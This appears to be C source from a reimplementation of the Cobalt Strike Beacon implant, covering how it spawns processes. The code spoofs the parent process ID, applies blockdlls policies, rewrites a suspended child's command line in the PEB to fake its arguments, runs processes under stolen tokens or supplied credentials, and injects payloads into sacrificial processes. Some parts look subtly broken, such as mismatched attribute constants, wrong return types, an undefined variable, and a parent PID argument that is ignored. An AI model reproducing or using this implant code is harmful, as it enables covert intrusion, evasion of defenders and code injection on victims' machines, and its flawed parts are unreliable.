PRUN_UNDER_CONTEXT ParentProcessContextInit(PRUN_UNDER_CONTEXT	context)
{
	context->handle = INVALID_HANDLE_VALUE;
	context->updateProcessAttributes = UpdateParentProcessContext;
	context->cleanup = CleanupParentProcessContext;
	return context;
}

PRUN_UNDER_CONTEXT UpdateChildProcessContext(PRUN_UNDER_CONTEXT context, DWORD parentPid, LPPROC_THREAD_ATTRIBUTE_LIST attributeList, STARTUPINFO* si)
{
	// Set the process attribute for the child process
	context->processAttribute = 0x100000000000; // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
	if (!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &context->processAttribute, sizeof(context->processAttribute), NULL, NULL))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not update process attribute: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_UPDATE_PROC_THREAD_ATTRIBUTE_LIST_FAILED, lastError);
		return FALSE;
	}

	// Set the error mode to prevent error dialogs
	if (&SetErrorMode)
		context->previousErrorMode = SetErrorMode(SEM_NOOPENFILEERRORBOX | SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

	return TRUE;
}

void CleanupChildProcessContext(PRUN_UNDER_CONTEXT context)
{
	// Restore the error mode
	if (&SetErrorMode)
		SetErrorMode(context->previousErrorMode);
}

PRUN_UNDER_CONTEXT ChildProcessContextInit(PRUN_UNDER_CONTEXT context)
{
	context->updateProcessAttributes = UpdateChildProcessContext;
	context->cleanup = CleanupChildProcessContext;
	return context;
}

typedef struct _RUN_UNDER_CONFIG
{
	char* cmd;
	int cmdLength;
	STARTUPINFO* startupInfo;
	PROCESS_INFORMATION* processInfo;
	int creationFlags;
	BOOL ignoreToken;
} RUN_UNDER_CONFIG;

void ProcThreadAttributeListDestroy(LPVOID lpAttributeList)
{
	DeleteProcThreadAttributeList(lpAttributeList);
	HeapFree(GetProcessHeap(), 0, lpAttributeList);
}

/**
 * @brief Adjusts the command line of a process by replacing it with a new one.
 *
 * This function is used for adjusting the command line of a process by allocating a new buffer,
 * converting the new command to wide characters, and writing it to the process memory.
 */
BOOL ProcessCmdAdjust(PROCESS_INFORMATION* processInfo, EXPANDED_CMD* cmds) {
	if(!IsProcess64Bit(processInfo->hProcess))
	{
		LERROR("x64 Beacon cannot adjust arguments in x86 process");
		BeaconErrorNA(ERROR_ADJUST_ARGUMENTS_BY_ARCH_FAILED);
		return FALSE;
	}

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(processInfo->hThread, &ctx))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not adjust arguments in process: %s - Reason: Could not get thread context", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);
		return FALSE;
	}

#if IS_X64()
	// Use RDX
	DWORD64 reg = ctx.Rdx;
#else
	// Use EBX
	DWORD64 reg = ctx.Ebx;
#endif

	const PEB* peb = (PEB*)reg;
	RTL_USER_PROCESS_PARAMETERS processParameters;
	if(!ReadProcessMemory(processInfo->hProcess, &peb->ProcessParameters, &processParameters, sizeof(peb->ProcessParameters), NULL))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not adjust arguments in process: %s - Reason: Could not read process parameters", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);
		return FALSE;
	}

	UNICODE_STRING commandLine = { 0 };
	if(!ReadProcessMemory(processInfo->hProcess, &processParameters.CommandLine, &commandLine, sizeof(commandLine), NULL))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not adjust arguments in process: %s - Reason: Could not read command line", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);
		return FALSE;
	}

	DWORD flOldProtect;
	if (!VirtualProtectEx(processInfo->hProcess, commandLine.Buffer, commandLine.MaximumLength, PAGE_READWRITE, &flOldProtect))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not adjust arguments in process: %s - Reason: Could not adjust permissions", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);
		return FALSE;
	}

	// FIXME: I do not understand why is this freed just only when an error occurs... I'm not sure if this is purposeful or not. Maybe a memory leak?
	WCHAR* newCmd = malloc(commandLine.MaximumLength);
	memset(newCmd, 0, commandLine.MaximumLength);

	if (!toWideChar(cmds->cmd, newCmd, commandLine.MaximumLength / sizeof(WCHAR)))
	{
		LERROR("Real arguments are longer than fake arguments.");
		BeaconErrorNA(ERROR_REAL_FAKE_ARGS_NO_MATCH);

		goto cleanup;
	}

	SIZE_T wrote;
	if(!WriteProcessMemory(processInfo->hProcess, commandLine.Buffer, newCmd, commandLine.MaximumLength, &wrote))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not adjust arguments in process: %s - Reason: Could not write new command line", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError);

		goto cleanup;
	}

	return TRUE;

	cleanup:
		free(newCmd);
		return FALSE;
}

BOOL SpawnProcessWithLogon(RUN_UNDER_CONFIG* runUnderConfig, WCHAR* cmd, const WCHAR* currentDirectory)
{
	if (!CreateProcessWithLogonW(
		gIdentityUsername,
		gIdentityDomain,
		gIdentityPassword,
		LOGON_NETCREDENTIALS_ONLY,
		NULL,
		cmd,
		runUnderConfig->creationFlags,
		NULL,
		currentDirectory,
		runUnderConfig->startupInfo,
		runUnderConfig->processInfo))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not spawn %s (token&creds): %s", execution->cmd, LAST_ERROR_STR(lastError));
		BeaconErrorDS(ERROR_SPAWN_TOKEN_AND_CREDS, lastError, runUnderConfig->cmd);
		return FALSE;
	}

	return TRUE;
}

BOOL  SpawnProcessWithTokenOrLogon(RUN_UNDER_CONFIG* runUnderConfig)
{
	int type;
	WCHAR cmd[1024] = { 0 };
	WCHAR buffer[1024] = { 0 };

	runUnderConfig->startupInfo->lpDesktop = 0;
	const WCHAR* lpCurrentDirectory = NULL;
	if (toWideChar(runUnderConfig->cmd, cmd, sizeof(cmd)/sizeof(WCHAR)))
	{
		if (GetCurrentDirectoryW(0, 0) < sizeof(cmd) / sizeof(WCHAR))
		{
			GetCurrentDirectoryW(sizeof(cmd) / sizeof(WCHAR), buffer);
			lpCurrentDirectory = buffer;
		}
		if (CreateProcessWithTokenW(
			gIdentityToken,
			LOGON_NETCREDENTIALS_ONLY,
			NULL,
			cmd,
			runUnderConfig->creationFlags,
			NULL,
			lpCurrentDirectory,
			runUnderConfig->startupInfo,
			runUnderConfig->processInfo))
		{
			return TRUE;
		}

		DWORD lastError = GetLastError();
		if (lastError == ERROR_PRIVILEGE_NOT_HELD
			&& CreateProcessWithLogonW && gIdentityIsLoggedIn == TRUE)
			return SpawnProcessWithLogon(runUnderConfig, cmd, lpCurrentDirectory);

		if (lastError == ERROR_INVALID_PARAMETER
			&& runUnderConfig->startupInfo->cb == sizeof(STARTUPINFOEXA) && CreateProcessWithLogonW)
		{
			LERROR("Could not spawn %s (token) with extended startup information. Reset ppid, disable blockdlls, or rev2self to drop your token.", runUnderConfig->cmd);
			type = ERROR_SPAWN_TOKEN_EXTENDED_STARTUPINFO;
		}
		else
		{
			LERROR("Could not spawn %s (token): %s", runUnderConfig->cmd, LAST_ERROR_STR(lastError));
			type = ERROR_SPAWN_PROCESS_AS_USER_FAILED;
		}
		BeaconErrorDS(type, lastError, runUnderConfig->cmd);
	}
	else
	{
		LERROR("Could not run command(w / token) because of its length of %d", runUnderConfig->cmdLength);
		BeaconErrorD(ERROR_LENGTHY_WIDECHAR_COMMAND, runUnderConfig->cmdLength);
	}

	return FALSE;
}

BOOL SpawnProcess(RUN_UNDER_CONFIG* execution)
{
	int lastError;

	if (!gIdentityToken || execution->ignoreToken)
	{
		if (!CreateProcessA(
			NULL,
			execution->cmd,
			NULL,
			NULL,
			TRUE,
			execution->creationFlags,
			NULL,
			NULL,
			execution->startupInfo,
			execution->processInfo))
		{
			lastError = GetLastError();
			LERROR("Could not spawn %s: %s", execution->cmd, LAST_ERROR_STR(lastError));
			BeaconErrorDS(ERROR_SPAWN_PROCESS_FAILED, lastError, execution->cmd);
			return FALSE;
		}
	}
	else if (!CreateProcessAsUserA(
		gIdentityToken,
		NULL,
		execution->cmd,
		NULL,
		NULL,
		TRUE,
		execution->creationFlags,
		NULL,
		NULL,
		execution->startupInfo,
		execution->processInfo))
	{
		lastError = GetLastError();
		if (lastError == ERROR_PRIVILEGE_NOT_HELD && CreateProcessWithTokenW)
		{
			LWARNING("Could not spawn %s (token): %s", execution->cmd, LAST_ERROR_STR(lastError));
			return SpawnProcessWithTokenOrLogon(execution);
		}

		LERROR("Could not spawn %s (token): %s", execution->cmd, LAST_ERROR_STR(lastError));
		BeaconErrorDS(ERROR_SPAWN_PROCESS_AS_USER_FAILED, lastError, execution->cmd);
		return FALSE;
	}
	return TRUE;
}

BOOL RunAsUserInternal(LPCCH domain, LPCCH username, LPCCH password, LPCCH cmd, int creationFlags, LPPROCESS_INFORMATION lpProcessInfo)
{
	datap* parser = BeaconDataAlloc(0xA000);
	WCHAR* lpCommandLine = BeaconDataPtr(parser, 0x4000);
	WCHAR* lpDomain = BeaconDataPtr(parser, 0x400);
	WCHAR* lpUsername = BeaconDataPtr(parser, 0x400);
	WCHAR* lpPassword = BeaconDataPtr(parser, 0x400);
	WCHAR* lpCurrentDirectory = BeaconDataPtr(parser, 0x400);

	STARTUPINFOA si = { sizeof(si) };
	*lpProcessInfo = { 0 };

	GetStartupInfoA(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = 0;
	si.hStdOutput = 0;
	si.hStdError = 0;
	si.lpDesktop = NULL;

	toWideChar(cmd, lpCommandLine, 0x4000);
	toWideChar(domain, lpDomain, 0x400);
	toWideChar(username, lpUsername, 0x400);
	toWideChar(password, lpPassword, 0x400);

	if (GetCurrentDirectoryW(0, 0) < 0x400)
	{
		GetCurrentDirectoryW(0x400, lpCurrentDirectory);
	}

	BOOL result = TRUE;
	if (!CreateProcessWithLogonW(
		lpUsername,
		lpDomain,
		lpPassword,
		LOGON_WITH_PROFILE,
		NULL,
		lpCommandLine,
		creationFlags | CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
		NULL,
		lpCurrentDirectory,
		(LPSTARTUPINFOW)&si,
		lpProcessInfo))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not run %s as %s\\%s: %s", cmd, domain, username, LAST_ERROR_STR(lastError));
		BeaconErrorPrintf(ERROR_RUN_AS_USER_FAILED, "%s as %s\\%s: %d", cmd, domain, username, lastError);
		result = FALSE;
	}

	BeaconDataFree(parser);
	return result;
}

void RunAsUser(char* buffer, int length)
{
	datap* locals = BeaconDataAlloc(0x4C00);
	char* cmd = BeaconDataPtr(locals, 0x4000);
	char* domain = BeaconDataPtr(locals, 0x400);
	char* username = BeaconDataPtr(locals, 0x400);
	char* password = BeaconDataPtr(locals, 0x400);

	datap parser;
	BeaconDataParse(&parser, buffer, length);

	if(!BeaconDataStringCopySafe(&parser, cmd, 0x4000))
		goto cleanup;

	if (!BeaconDataStringCopySafe(&parser, domain, 0x400))
		goto cleanup;

	if (!BeaconDataStringCopySafe(&parser, username, 0x400))
		goto cleanup;

	if (!BeaconDataStringCopySafe(&parser, password, 0x400))
		goto cleanup;

	IdentityRevertToken();
	PROCESS_INFORMATION pi;
	RunAsUserInternal(domain, username, password, cmd, 0, &pi);
	IdentityImpersonateToken();
	BeaconCleanupProcess(&pi);

	cleanup:
	BeaconDataFree(locals);
}

BOOL RunProcessWithAdjustedCmd(RUN_UNDER_CONFIG* execution)
{
	EXPANDED_CMD cmds;

	if ((execution->creationFlags & CREATE_SUSPENDED) != 0 || ArgumentFindMatch(&cmds, execution->cmd) == FALSE)
		return SpawnProcess(execution);

	execution->creationFlags |= CREATE_SUSPENDED;
	execution->cmd = cmds.fullCmd;
	BOOL result = SpawnProcess(execution);
	const BOOL couldAdjust = ProcessCmdAdjust(execution->processInfo, &cmds);
	if (couldAdjust)
	{
		ResumeThread(execution->processInfo->hThread);
	}
	else
	{
		TerminateProcess(execution->processInfo->hProcess, 0);
		result = FALSE;
	}

	return result;
}

BOOL RunUnder_(RUN_UNDER_CONFIG* runUnderConfig, int parentPid)
{

	DWORD count = 0;
	if (parentPid)
		count++;

	if (gBlockDlls)
		count++;

	if (count == 0)
		return RunProcessWithAdjustedCmd(runUnderConfig);

	const PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = ProcThreadAttributeListInit(count);

	RUN_UNDER_CONTEXT context;
	RUN_UNDER_CONTEXT parentContext = *ParentProcessContextInit(&context);
	RUN_UNDER_CONTEXT childContext = *ChildProcessContextInit(&context);

	BOOL result = FALSE;

	if (!parentPid || parentContext.updateProcessAttributes(
		&parentContext,
		parentPid,
		lpAttributeList,
		runUnderConfig->startupInfo))
	{
		if (!gBlockDlls
			|| childContext.updateProcessAttributes(&childContext, parentPid, lpAttributeList, runUnderConfig->startupInfo))
		{
			STARTUPINFOEXA si_;
			si_.StartupInfo = *runUnderConfig->startupInfo;
			si_.StartupInfo.cb = sizeof(STARTUPINFOEXA);
			si_.lpAttributeList = lpAttributeList;
			runUnderConfig->startupInfo = &si_;
			runUnderConfig->creationFlags |= EXTENDED_STARTUPINFO_PRESENT;

			result = RunProcessWithAdjustedCmd(runUnderConfig);

			if (parentPid)
				parentContext.cleanup(&parentContext);

			if (gBlockDlls)
				childContext.cleanup(&childContext);
		}
	}

	ProcThreadAttributeListDestroy(lpAttributeList);

	return result;
}

BOOL RunUnder(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_INFORMATION* processInfo, int creationFlags, BOOL ignoreToken, int parentPid)
{
	RUN_UNDER_CONFIG runUnderConfig = { cmd, cmdLength, startupInfo, processInfo, creationFlags, ignoreToken };
	return RunUnder_(&runUnderConfig, 0);
}


BOOL RunUnderParent(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_INFORMATION* processInfo, int creationFlags, BOOL ignoreToken)
{
	return RunUnder(cmd, cmdLength, startupInfo, processInfo, creationFlags, ignoreToken, gParentPid);
}

void RunUnderPid(char* buffer, int length)
{
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	GetStartupInfoA(&si);
	si.wShowWindow = SW_HIDE;
	si.hStdInput = 0;
	si.hStdOutput = 0;
	si.hStdError = 0;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

#define MAX_CMD 0x2000
	datap* locals = BeaconDataAlloc(MAX_CMD);
	char* cmd = BeaconDataPtr(locals, MAX_CMD);

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int pid = BeaconDataInt(&parser);
	BeaconDataStringCopySafe(&parser, cmd, MAX_CMD);
	RunUnder(cmd, strlen(cmd), &si, &pi, CREATE_NEW_CONSOLE, FALSE, pid);
	BeaconCleanupProcess(&pi);

	BeaconDataFree(locals);
}

void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
{
	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
}

void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len)
{
	BeaconInjectProcessInternal(pInfo, pInfo->hProcess, pInfo->dwProcessId, payload, p_len, p_offset, arg, a_len);
}

BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pInfo)
{
	char cmd[MAX_PATH];
	SpawnToFix(x86, cmd);
	return RunUnderParent(cmd, strlen(cmd), si, pInfo, CREATE_SUSPENDED, ignoreToken);
}

void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo)
{
	if (pInfo->hProcess)
		CloseHandle(pInfo->hProcess);

	if (pInfo->hThread)
		CloseHandle(pInfo->hThread);
}


void Execute(char* buffer, int length)
{
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	GetStartupInfoA(&si);
	si.wShowWindow = SW_HIDE;
	memset(&si.hStdInput, 0, sizeof(si.hStdInput));
	memset(&si.hStdOutput, 0, sizeof(si.hStdOutput));
	memset(&si.hStdError, 0, sizeof(si.hStdError));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

#define MAX_CMD 1024
	if (length >= MAX_CMD)
		return;

	char cmd[MAX_CMD];
	strncpy(cmd, buffer, length);
	cmd[length] = 0;
	RunUnderParent(cmd, length, &si, &pi, 0, FALSE);
	BeaconCleanupProcess(&pi);
}

BOOL SpawnAsUserInternal(BOOL x86, char* lpDomain, char* lpUsername, char* lpPassword, PROCESS_INFORMATION* lpProcessInfo)
{
	char cmd[256];
	SpawnToFix(x86, cmd);
	return RunAsUserInternal(lpDomain, lpUsername, lpPassword, cmd, CREATE_SUSPENDED, lpProcessInfo);
}

void SpawnAsUser(char* buffer, int length, BOOL x86)
{
#define MAX_DOMAIN 1024
#define MAX_USERNAME 1024
#define MAX_PASSWORD 1024

	datap* locals = BeaconDataAlloc(MAX_DOMAIN + MAX_USERNAME + MAX_PASSWORD);

	char* domain = BeaconDataPtr(locals, MAX_DOMAIN);
	char* username = BeaconDataPtr(locals, MAX_USERNAME);
	char* password = BeaconDataPtr(locals, MAX_PASSWORD);

	datap parser;
	BeaconDataParse(&parser, buffer, length);

	if (!BeaconDataStringCopySafe(&parser, domain, MAX_DOMAIN))
		goto cleanup;

	if (!BeaconDataStringCopySafe(&parser, username, MAX_USERNAME))
		goto cleanup;

	if (!BeaconDataStringCopySafe(&parser, password, MAX_PASSWORD))
		goto cleanup;

	PROCESS_INFORMATION pi;
	if (SpawnAsUserInternal(x86, domain, username, password, &pi))
	{
		Sleep(100);

		int size = BeaconDataLength(&parser);
		char* data = BeaconDataBuffer(&parser);
		BeaconInjectTemporaryProcess(&pi, data, size, 0, NULL, 0);
	}

	BeaconCleanupProcess(&pi);

cleanup:
	BeaconDataFree(locals);
}

BOOL SpawnUnderInternal(BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pi, int pid)
{
	char cmd[256];
	SpawnToFix(x86, cmd);
	return RunUnder(cmd, strlen(cmd), si, pi, CREATE_SUSPENDED, ignoreToken, pid);
}

void SpawnUnder(char* buffer, int length, BOOL x86)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int pid = BeaconDataInt(&parser);
	char* payload = BeaconDataBuffer(&parser);
	int payloadLength = BeaconDataLength(&parser);

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	GetStartupInfoA(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = 0;
	si.hStdOutput = 0;
	si.hStdError = 0;

	if (SpawnUnderInternal(x86, TRUE, &si, &pi, pid))
	{
		Sleep(100);
		BeaconInjectTemporaryProcess(&pi, payload, payloadLength, 0, NULL, 0);
		BeaconCleanupProcess(&pi);
	}
}

BOOL RunIsSameSessionAsCurrent(int pid)
{
	int sessionId;
	if (!ProcessIdToSessionId(pid, &sessionId))
		return TRUE;

	int currentSessionId;
	if (!ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId))
		return TRUE;

	return sessionId == currentSessionId;
}

void RunSetParentPid(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	gParentPid = BeaconDataInt(&parser);

	if(gParentPid && !RunIsSameSessionAsCurrent(gParentPid))
	{
		LERROR("PPID %d is in a different desktop session (spawned jobs may fail). Use 'ppid' to reset.", gParentPid);
		BeaconErrorD(ERROR_PARENT_PROCESS_NOT_IN_SAME_SESSION, gParentPid);
	}
}

void SpawnSetTo(char* buffer, int length, BOOL x86)
{
	if(!gSpawnToX86 || !gSpawnToX64)
	{
#define MAX_SPAWN_TO 256
#define MAX_SPAWN_TO_X86 MAX_SPAWN_TO
#define MAX_SPAWN_TO_X64 MAX_SPAWN_TO
		datap* parser = BeaconDataAlloc(MAX_SPAWN_TO_X86 + MAX_SPAWN_TO_X64);
		gSpawnToX86 = BeaconDataPtr(parser, MAX_SPAWN_TO_X86);
		gSpawnToX64 = BeaconDataPtr(parser, MAX_SPAWN_TO_X64);
	}

	if(length != 0 && length <= 256)
	{
		char* dst;
		int size;
		if(x86)
		{
			dst = gSpawnToX86;
			size = MAX_SPAWN_TO_X86;
			
		}
		else
		{
			dst = gSpawnToX64;
			size = MAX_SPAWN_TO_X64;
		}

		memset(dst, 0, size);
		memcpy(dst, buffer, length);
	} else
	{
		memset(gSpawnToX86, 0, MAX_SPAWN_TO_X86);
		memset(gSpawnToX64, 0, MAX_SPAWN_TO_X64);
	}
}